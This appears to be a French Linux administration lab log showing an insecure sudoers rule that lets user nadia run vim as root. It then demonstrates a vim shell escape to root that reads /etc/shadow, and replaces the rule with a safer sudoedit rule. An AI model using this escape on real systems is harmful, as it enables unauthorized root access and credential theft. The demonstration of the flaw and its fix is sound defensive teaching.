@@ -1,0 +1,33 @@
+$ cat /etc/sudoers.d/99-mauvais-exemple ; visudo -c
+nadia ALL=(root) NOPASSWD: /usr/bin/vim /srv/helios/projets/transport/*
+/etc/sudoers : analyse réussie
+/etc/sudoers.d/90-helios-ops : analyse réussie
+/etc/sudoers.d/99-mauvais-exemple : analyse réussie
+
+$ su - nadia -c "sudo -n /usr/bin/vim /srv/helios/projets/transport/tournee-nadia.csv -E -s -c '!/usr/bin/id > /tmp/evasion-id.txt' -c 'q!'"
+
+$ cat /tmp/evasion-id.txt
+uid=0(root) gid=0(root) groupes=0(root) contexte=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+$ su - nadia -c "sudo -n /usr/bin/vim /srv/helios/projets/transport/tournee-nadia.csv -E -s -c '!(whoami; head -1 /etc/shadow) > /tmp/evasion-id.txt' -c 'q!'" ; cat /tmp/evasion-id.txt
+root
+root:EMPREINTE-MASQUEE
+
+$ cat /etc/sudoers.d/91-nadia-edition ; visudo -c
+Defaults:nadia !sudoedit_checkdir
+nadia ALL=(root) sudoedit /srv/helios/projets/transport/*
+/etc/sudoers : analyse réussie
+/etc/sudoers.d/90-helios-ops : analyse réussie
+/etc/sudoers.d/91-nadia-edition : analyse réussie
+
+$ su - nadia -c 'sudo -n /usr/bin/vim /srv/helios/projets/transport/tournee-nadia.csv'
+sudo: il est nécessaire de saisir un mot de passe
+-> rc=1 (attendu !=0 (vim n'est plus autorise))
+
+$ echo 'Helios-TP2-2026' | su - nadia -c 'SUDO_EDITOR=/usr/local/bin/tp2-editeur-demo sudoedit -S /srv/helios/projets/transport/tournee-nadia.csv'
+[sudo] Mot de passe de nadia : -> rc=0 (attendu 0)
+
+$ tail -2 /srv/helios/projets/transport/tournee-nadia.csv ; ls -l /srv/helios/projets/transport/tournee-nadia.csv
+# edite via sudoedit par nadia le 2026-11-03 14:37:07
+-rw-r-----+ 1 nadia transport 54  3 nov.  14:37 /srv/helios/projets/transport/tournee-nadia.csv
+
